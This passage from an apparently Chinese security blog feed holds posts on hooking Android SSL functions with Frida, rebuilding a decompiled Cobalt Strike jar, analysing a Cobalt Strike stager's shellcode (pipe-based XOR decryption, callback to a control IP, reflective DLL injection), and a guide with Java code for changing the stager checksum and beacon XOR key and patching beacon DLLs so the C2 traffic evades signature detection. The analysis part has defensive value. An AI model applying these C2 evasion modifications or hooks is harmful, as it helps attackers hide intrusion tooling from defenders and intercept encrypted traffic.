        com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream.write(&apos;[B&apos;,&apos;int&apos;,&apos;int&apos;)
        com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream.read(&apos;[B&apos;,&apos;int&apos;,&apos;int&apos;)</code></pre><h5 id="native"><a href="#native" class="headerlink" title="native"></a>native</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;system&#x2F;lib&#x2F;libssl.so库中的SSL_read()和SSL_write()</span><br><span class="line">说明：</span><br><span class="line">	Java中的SSLOutputSteam.write()和SSLInputStream.read()实际上就是对libssl.so库的SSL_write()和SSL_read()包装调用</span><br></pre></td></tr></table></figure>

<h4 id="frida"><a href="#frida" class="headerlink" title="frida"></a>frida</h4><h5 id="java-1"><a href="#java-1" class="headerlink" title="java"></a>java</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java.use(&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLOutputStream&quot;).write.overload(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.ConscryptFileDescriptorSocket$SSLInputStream&quot;).read.overload(&#39;[B&#39;,&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.OpenSSLSocketImpl$SSLOutputStream&quot;).write.overload(&#39;[B&#39;，&#39;int&#39;,&#39;int&#39;).implementation</span><br><span class="line">java.use(&quot;com.android.org.conscrypt.OpenSSLSocketImpl$SSLInputStream&quot;).Read.overload(&#39;[B&#39;，&#39;int&#39;,&#39;int&#39;).implementation</span><br></pre></td></tr></table></figure>

<h5 id="native-1"><a href="#native-1" class="headerlink" title="native"></a>native</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Interceptor.attach(address[&#39;SSL_read&#39;])</span><br><span class="line">Interceptor.attach(address[&#39;SSL_write&#39;])</span><br></pre></td></tr></table></figure>



<h3 id="协议使用了自我集成的SSL类库"><a href="#协议使用了自我集成的SSL类库" class="headerlink" title="协议使用了自我集成的SSL类库"></a>协议使用了自我集成的SSL类库</h3><p>举出一些常用的例子</p>
<p>1.Chrome</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Android L &amp; M libchrome.so</span><br><span class="line">Android N, O &amp; P libmonochrome.so</span><br></pre></td></tr></table></figure>

<p>2.系统内置webview</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用(pm path com.google.android.webview)得到webview的路径</span><br></pre></td></tr></table></figure>

<p>3.浏览器APP的webviewer</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OPPO</span><br><span class="line">	libheytapwebview.so</span><br><span class="line">华为</span><br><span class="line">	libhwwebviewchromium.so</span><br><span class="line">小米</span><br><span class="line">	libmiui_chromium.so</span><br><span class="line">vivo</span><br><span class="line">	libwebviewchromium_vivo.so</span><br></pre></td></tr></table></figure>

<p>4.基于Chromium的第三方浏览器内核</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">腾讯系的APP</span><br><span class="line">	libmttwebview.so x5内核</span><br><span class="line">阿里系的APP</span><br><span class="line">	libwebviewuc.so UC的U4内核</span><br><span class="line">各种小程序</span><br><span class="line">	libxwalkcore.so CrossWalk内核</span><br></pre></td></tr></table></figure>

<p>5.微信(使用多内核的APP)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有些APP回使用多个内核，以微信为例，同时使用了X5和CrossWalk内核</span><br><span class="line">	x5</span><br><span class="line">	com.tencent.mm.tools进程</span><br><span class="line">聊天界面点开的webview、支付里的页面(长按下啦提示使用x5内核的都可以)</span><br><span class="line">	CrossWalk</span><br><span class="line">		长按下拉未提示x5</span><br><span class="line">	com.tencent.mm:toolsmp进程</span><br><span class="line">		公众号文章、搜一搜</span><br><span class="line">	com.tencent.mm:appbrand进程</span><br><span class="line">		小程序</span><br></pre></td></tr></table></figure>



<h4 id="native-2"><a href="#native-2" class="headerlink" title="native"></a>native</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.对于native库，写脚本定位APP自带的SSL_read和SSL_write的偏移量，工程性质问题</span><br><span class="line">	https:&#x2F;&#x2F;mabin004.github.io&#x2F;2020&#x2F;07&#x2F;24&#x2F;自动定位webview中的SLL-read和SSL-write&#x2F;</span><br><span class="line">	https:&#x2F;&#x2F;nytrosecurity.com&#x2F;2018&#x2F;02&#x2F;26&#x2F;hooking-chromes-ssl-functions&#x2F;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>APP测试</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike二开环境初探</title>
    <url>/2021/11/09/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltStrike%E4%BA%8C%E5%BC%80%E7%8E%AF%E5%A2%83%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们使用CobaltStrike的时候，进行性的需要进行二次开发，使其对应的功能更加丰富，更加方便我们团队联合进行渗透的稳定性和隐蔽性。</p>
<img src="https://kosakd.top/2021/05/05/CobaltStrike%E6%95%99%E7%A8%8B/2.png" alt="2" style="zoom:50%;">

<h1 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h1><blockquote>
<p><code>IntelliJ IDEA</code> 自带了一个反编译java的工具，有时候我们需要对 <code>cobaltstrike</code> 的整个 <code>jar</code> 包进行反编译，使用这个 <code>IntelliJ IDEA</code> 双击之类的反编译时要是对整个源码层面进行搜索并不是很方便，可使用其自带的反编译工具，可以做到批量的整个反编译。</p>
<p>这里先在 <code>IntelliJ IDEA</code> 安装目录找到 <code>java-decompiler.jar</code> 拷贝到一个准备好的目录，并且新建两个文件，一个 <code>cs_bin</code> 里面放未反编译的 <code>cobaltstrike</code> 再建一个 <code>cs_src</code> 文件，这个是空文件，是为了之后放反编译后的 <code>cobaltstrike</code></p>
</blockquote>
<a id="more"></a>

<p>在对应目录下进行拷贝</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;IntelliJ IDEA.app&#x2F;Contents&#x2F;plugins&#x2F;java-decompiler&#x2F;lib&#x2F;java-decompiler.jar</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109112414086.png" alt="image-20211109112414086"></p>
<p>进入到java-decompiler中找到decompiler的路径，提取出来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;org&#x2F;jetbrains&#x2F;java&#x2F;decompiler&#x2F;IdeaDecompiler$LegalBurden.class</span><br></pre></td></tr></table></figure>

<p>将所有的反斜杠替换成.随之再其后加上ConsoleDecompilers，如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">org.jetbrains.java.decompiler.IdeaDecompiler$LegalBurden.class.ConsoleDecompilers</span><br></pre></td></tr></table></figure>

<p>因为MANIFEST.MF中是没有main class属性，没有制定主类，所以不能直接使用<code>java -jar</code>，如果想要直接执行Java包中具体的类，要使用java -cp输入如下命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler</span><br></pre></td></tr></table></figure>

<p>执行的时候会有提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler</span><br><span class="line">Usage: java -jar fernflower.jar [-&lt;option&gt;&#x3D;&lt;value&gt;]* [&lt;source&gt;]+ &lt;destination&gt;</span><br><span class="line">Example: java -jar fernflower.jar -dgs&#x3D;true c:\my\source\ c:\my.jar d:\decompiled\</span><br></pre></td></tr></table></figure>

<p>让你加上<code>-dgs=true</code>之后加上反编译的cobaltstrike和反编译之后要把结果放入的目录，输入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs&#x3D;true cs_bin&#x2F;cobaltstrike.jar cs_src&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109114350746.png" alt="image-20211109114350746"></p>
<p>反编译完成后，会自动打包成jar包，右键解压后打开可以看到都是.java了，反编译出来就可以直接放入IntelliJ IDEA中，可直接搜索代码和相关的代码交叉引用。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109114720498.png" alt="image-20211109114720498"></p>
<h1 id="IDEA二次开发环境构造"><a href="#IDEA二次开发环境构造" class="headerlink" title="IDEA二次开发环境构造"></a>IDEA二次开发环境构造</h1><p>打开IDEA选择Create New Project 一直选择Next，创建好后，先建立两个文件夹<code>decompiled_src</code>文件夹，之后再建立一个<code>lib</code>文件夹。将反编译好的CobaltStrike复制到decompiled_src中，然后把它解压出来</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120423523.png" alt="image-20211109120423523" style="zoom:50%;">

<p>然后把原始的未反编译的CobaltStrike放到刚刚新建的lib中去</p>
<p>结下来我们要对这个项目进行设置，点击<code>File</code>中的<code>Project Structure</code>在<code>Modules</code>对<code>Dependencies</code>进行设置.</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120705932.png" alt="image-20211109120705932"></p>
<p>选择lib中的cobalt strike.jar， 确认是Compile之后勾选一下，然后选择Apply。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109120959418.png" alt="image-20211109120959418"></p>
<p>依赖关系设置完成后，进入Artifacts——&gt;JAR——&gt;From modules with dependencies</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121200835.png" alt="image-20211109121200835"></p>
<p>这里需要填写一个Main Class，去lib中的META-INF里面双击MANIFEST.MF</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121328249.png" alt="image-20211109121328249"></p>
<p>复制aggressor.Aggressor，再次打开选择OK这里就设置完成了。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109121447940.png" alt="image-20211109121447940"></p>
<p>接下来再decompiled_src中找到已经反编译完的aggressor主类，右键选择Refactor –Copy File</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122002190.png" alt="image-20211109122002190"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122051094.png" alt="image-20211109122051094"></p>
<p>在To directory点击添加，选择之前创建的src在其中提阿健一个aggressor名字要一致，最后点击OK</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109122242765.png" alt="image-20211109122242765"></p>
<p>这样aggressor就自动的被拷贝到src目录里去了，这里可以看一下</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109160037402.png" alt="image-20211109160037402"></p>
<p>试着修改一下文档，保存。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109160235084.png" alt="image-20211109160235084"></p>
<p>到这里我们基本的准备工作就完成了，之后我们需要修改哪个文件，就可以在完整的源码中找到那个文件，然后邮件Refactor后然Copy File到这个目录进行修改，修改完成之后就可以选Build–&gt;Build Artifacts–&gt;Build进行编译</p>
<p>当提示<code>Build completed successfully in 4 s 670 ms</code>会在out文件夹生成我们编译好的SecondC2.jar</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161214075.png" alt="image-20211109161214075"></p>
<p>在每次调试运行的时候，不需要切换到命令行环境，可以直接配置对应的参数如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161644494.png" alt="image-20211109161644494"></p>
<p>最后在Run中选择Run C2级可以看到消息窗口</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161624209.png" alt="image-20211109161624209" style="zoom:50%;">

<p>点击确认，发现弹出提示，点击确定</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109161817082.png" alt="image-20211109161817082"></p>
<p>拿出<code>-XX:+AggressuveHeap</code>复制并放到Run-&gt;Profile中的VM options中</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162250841.png" alt="image-20211109162250841"></p>
<p>再次运行，再次复制<code>-XX:+UseParallelGC</code>继续添加到VM options中，记得要用空格隔开。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162419743.png" alt="image-20211109162419743"></p>
<p>再次运行，提示缺少.auth文件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109162720558.png" alt="image-20211109162720558"></p>
<p>这里把初始的cobaltstrike.auth文件复制到SecondC2.jar同目录下。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211109163005947.png" alt="image-20211109163005947" style="zoom:33%;">

<p>最后运行，就可以成功启动，接下来根据我们对应的需求，在项目中就行关键字搜索就可以定位到相关功能的代码处，从而进行相应的修改，或做一些功能上的增强。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>C2</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltSrike Shellcode分析</title>
    <url>/2021/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike-Shellcode%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>首先我们来看一张流程图</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201045600.png" alt="image-20211123201045600"></p>
<p>首先打开IDA进行查看</p>
<p>进入主函数，主要看sub_401840()函数进行查看</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112185819017.png" alt="image-20211112185819017"></p>
<p>进入函数发现，首先获取系统时间戳，然后拼接字符串和创建线程通过管道读取shellcode，最后执行shellcode</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114141830161.png" alt="image-20211114141830161"></p>
<a id="more"></a>

<p>拼接的管道名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004053F0&#x3D;artifact.004053F0 (ASCII &quot;\\.\pipe\MSSE-5866-server&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114142512415.png" alt="image-20211114142512415"></p>
<p>跟进线程创建线程执行的函数，首先创建命名管道，再把加密过的shellcode写入管道</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114143133792.png" alt="image-20211114143133792"></p>
<p>Shellcode内容</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114143858237.png" alt="image-20211114143858237"></p>
<p>写入shellcode</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150018919.png" alt="image-20211114150018919"></p>
<p>跟进接收shellcode函数RevShellcode_40172:其主题逻辑是先申请内存存放读取出来的shellcode，然后再解密执行</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150317625.png" alt="image-20211114150317625"></p>
<p>从管道中读取shellcode到内存中</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150501720.png" alt="image-20211114150501720"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114150714414.png" alt="image-20211114150714414"></p>
<p>将读取出来的Shellcode在DecyptandrRunShellcode_40158E函数中执行解密，该函数的主题逻辑，申请内存存放解密后的shellcode，然后修改内存属性并跳转运行</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151059974.png" alt="image-20211114151059974"></p>
<p>解密算法如下，首先遍历shellcode，遍历次数与4求模，得到的值作为403008数组的下标得到一字节，用该字节与shellcode对应遍历时的字节异或，最终得到解密后的字节</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151532706.png" alt="image-20211114151532706"></p>
<p>解密所需的数组</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114151904493.png" alt="image-20211114151904493"></p>
<p>解密后的数据</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114152353437.png" alt="image-20211114152353437"></p>
<p>之后跳转并执行</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114152614378.png" alt="image-20211114152614378"></p>
<h1 id="Shellcode部分"><a href="#Shellcode部分" class="headerlink" title="Shellcode部分"></a>Shellcode部分</h1><p>先加载wininet.dll</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114161929815.png" alt="image-20211114161929815"></p>
<p>之后调用InternetOpen函数</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162309532.png" alt="image-20211114162309532"></p>
<p>连接控制端192.168.202.131</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162334075.png" alt="image-20211114162334075"></p>
<p>请求Beacon URL： /FXhV</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114162518977.png" alt="image-20211114162518977"></p>
<p>发送HTTP请求</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174801303.png" alt="image-20211114174801303"></p>
<p>获取桌面窗口句柄</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174830200.png" alt="image-20211114174830200"></p>
<p>处理前面对话窗口遇到的错误</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114175616822.png" alt="image-20211114175616822"></p>
<p>申请内存</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174903855.png" alt="image-20211114174903855"></p>
<p>多次调用InternetReadFile读取文件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114174923492.png" alt="image-20211114174923492"></p>
<p>读取完成后跳转执行到所申请的内存</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211114175016024.png" alt="image-20211114175016024"></p>
<p>这里需要解密出一个dll，具体的解密算法如下：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115122512735.png" alt="image-20211115122512735"></p>
<p>解密后的数据：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115163932049.png" alt="image-20211115163932049"></p>
<p>反射注入DLL：</p>
<p>查看解密出来的DLL</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115172616776.png" alt="image-20211115172616776"></p>
<p>0x36c0032 -&gt; 0x36c0041 也就是DLL的Dos头部分，下面ebx+0x8150，也是导出函数ReflectiveLoader函数的偏移</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115172820956.png" alt="image-20211115172820956"></p>
<p>在导出函数ReflectiveLoader函数中解析DLL，ReflectiveLoader中会调用virtualalloc()函数，申请大小为0x30000的内存，用于存放DLL：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173716075.png" alt="image-20211115173716075"></p>
<p>在内存中反射注入dll,存放在eax中0x3D15DA8</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173811388.png" alt="image-20211115173811388"></p>
<p>然后开始执行dll，此时也可以到自己的c2还没有主机上线</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211115173929114.png" alt="image-20211115173929114"></p>
<p>执行dll中</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103030220.png" alt="image-20211116103030220"></p>
<p>获取对应的系统信息拼接</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103131000.png" alt="image-20211116103131000"></p>
<p>获取cookie</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103241470.png" alt="image-20211116103241470"></p>
<p>获取配置信息</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103319764.png" alt="image-20211116103319764"></p>
<p>调用，wininet.HttpSendRequestA请求上线</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103445022.png" alt="image-20211116103445022"></p>
<p>上线回连</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103628751.png" alt="image-20211116103628751"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116103533769.png" alt="image-20211116103533769"></p>
<p>对默认生成的shellcode分析发现存在大量的特征信息，导入配置文件后再次对shellcode进行分析，发现对应的关键信息已经修改</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115524286.png" alt="image-20211116115524286"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115534263.png" alt="image-20211116115534263"></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211116115540028.png" alt="image-20211116115540028"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>C2</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltSrike二次开发之流量修改</title>
    <url>/2021/11/23/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/CobaltSrike%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%81%E9%87%8F%E4%BF%AE%E6%94%B9/</url>
    <content><![CDATA[<h1 id="CobaltStrike特征修改"><a href="#CobaltStrike特征修改" class="headerlink" title="CobaltStrike特征修改"></a>CobaltStrike特征修改</h1><h2 id="修改Stager防止被直接扫描：修改位置如下"><a href="#修改Stager防止被直接扫描：修改位置如下" class="headerlink" title="修改Stager防止被直接扫描：修改位置如下"></a>修改Stager防止被直接扫描：修改位置如下</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cloudstrike&#x2F;webserver.java</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201537986.png" alt="image-20211123201537986"></p>
<p>修改isStager函数，只要不是92或者93就行。这里首先需要修改checksum8，将其返回值改为return sum</p>
<a id="more"></a>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123201720257.png" alt="image-20211123201720257"></p>
<p>利用脚本来生成我们的返回值</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    public static long checksum8(String text) &#123;</span><br><span class="line">        if (text.length() &lt; 4) &#123;</span><br><span class="line">            return 0L;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            text &#x3D; text.replace(&quot;&#x2F;&quot;, &quot;&quot;);</span><br><span class="line">            long sum &#x3D; 0L;</span><br><span class="line"></span><br><span class="line">            for(int x &#x3D; 0; x &lt; text.length(); ++x) &#123;</span><br><span class="line">                sum +&#x3D; (long)text.charAt(x);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return sum ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">    public static void main(String []args) &#123;</span><br><span class="line">        String key &#x3D; &quot;703e7b3b4e2a07715552e466e0d231bd&quot;;</span><br><span class="line">        long flag &#x3D; checksum8(key);</span><br><span class="line">        System.out.println(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>key我们使用wings来生成md5，然后运行获取对应的值</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123202249235.png" alt="image-20211123202249235"></p>
<p>将我们值放入替换92L为2131L</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static boolean isStager(String uri) &#123;</span><br><span class="line">   return checksum8(uri) &#x3D;&#x3D; 2131L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时修改return为我们生成的key</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">common&#x2F;CommonUtils.java</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static String MSFURI(int var0) &#123;</span><br><span class="line">   String[] var1 &#x3D; toArray(&quot;a, b, c, d, e, f, h, i, j, k, l, m, n, o, p, q, r, s, t, u, v, w, x, y, z, A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z, 1, 2, 3, 4, 5, 6, 7, 8, 9, 9&quot;);</span><br><span class="line"></span><br><span class="line">   StringBuffer var2;</span><br><span class="line">   do &#123;</span><br><span class="line">      var2 &#x3D; new StringBuffer(var0 + 1);</span><br><span class="line">      var2.append(&quot;&#x2F;&quot;);</span><br><span class="line"></span><br><span class="line">      for(int var3 &#x3D; 0; var3 &lt; var0; ++var3) &#123;</span><br><span class="line">         var2.append(pick(var1));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; while(checksum8(var2.toString()) !&#x3D; 2131L);</span><br><span class="line"></span><br><span class="line">   return &quot;703e7b3b4e2a07715552e466e0d231bd&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123202512901.png" alt="image-20211123202512901"></p>
<p>X64同理进行修改</p>
<p>之后修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon&#x2F;BeaconPayload.java</span><br></pre></td></tr></table></figure>

<p>将异或值0x2e改为0x3e(默认显示为10进制，我们改为62即可)</p>
<blockquote>
<p>根据之前的特征信息我们可知</p>
<p>cs 3.x版本的配置信息是通过异或0x69解密出的，4.x版本的配置信息是通过异或0x2e解密出的。</p>
<p>至此，可以发现，从3.x到4.x，cs自解密的算法没变，自解密后再解密配置文件的算法就只是改了个密钥，而且是固定的（3.x 0x69，4.x 0x2e）。    </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static byte[] beacon_obfuscate(byte[] var0) &#123;</span><br><span class="line">   byte[] var1 &#x3D; new byte[var0.length];</span><br><span class="line"></span><br><span class="line">   for(int var2 &#x3D; 0; var2 &lt; var0.length; ++var2) &#123;</span><br><span class="line">      var1[var2] &#x3D; (byte)(var0[var2] ^ 62);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   return var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="修改DLL文件"><a href="#修改DLL文件" class="headerlink" title="修改DLL文件"></a>修改DLL文件</h2><p>同时我们需要到生成时调用的DLL文件进行修改，否则会导致异或值不一样导致的无法上线，下载解密的问题</p>
<p>使用脚本对Sleeve进行解密，具体原理可以查看CobaltStrike的认证流程</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;ca3tie1&#x2F;CrackSleeve</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123203240973.png" alt="image-20211123203240973"></p>
<p>将解密出来的文件拖到IDA，搜索0x2e关键字，打patch修改为0x3e</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123203454667.png" alt="image-20211123203454667"></p>
<p>同时需要修改的有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">beacon.dll</span><br><span class="line">beacon.x64.dll</span><br><span class="line">dnsb.dll</span><br><span class="line">dnsb.x64.dll</span><br><span class="line">pivot.dll</span><br><span class="line">pivot.x64.dll</span><br></pre></td></tr></table></figure>

<p>将修改之后的dll放入并加密</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211123204004260.png" alt="image-20211123204004260"></p>
<p>将之前修改的Java，和我们的dll 重新导入jar文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BeaconPayload.java</span><br><span class="line">Webserver.java</span><br><span class="line">commonutil.java</span><br></pre></td></tr></table></figure>

<p>进行测试上线，发现特征流量已经修改</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211124125228589.png" alt="image-20211124125228589"></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://cloud.tencent.com/developer/article/1764340">https://cloud.tencent.com/developer/article/1764340</a></p>
<p><a href="https://lengjibo.github.io/CobaltStrikeCode/">https://lengjibo.github.io/CobaltStrikeCode/</a></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>C2</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-16875: Exchange Server 远程代码执行漏洞</title>
    <url>/2020/09/14/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/pwnable.kr/Exploit/CVE-2020-16875-Exchange-Server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><em>更新公告:<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16875</a></em></p>
<p>微软公告说的很明显,只需要一个Exchange用户账号。就能在Exchange服务器上执行任意命令。</p>
<a id="more"></a>

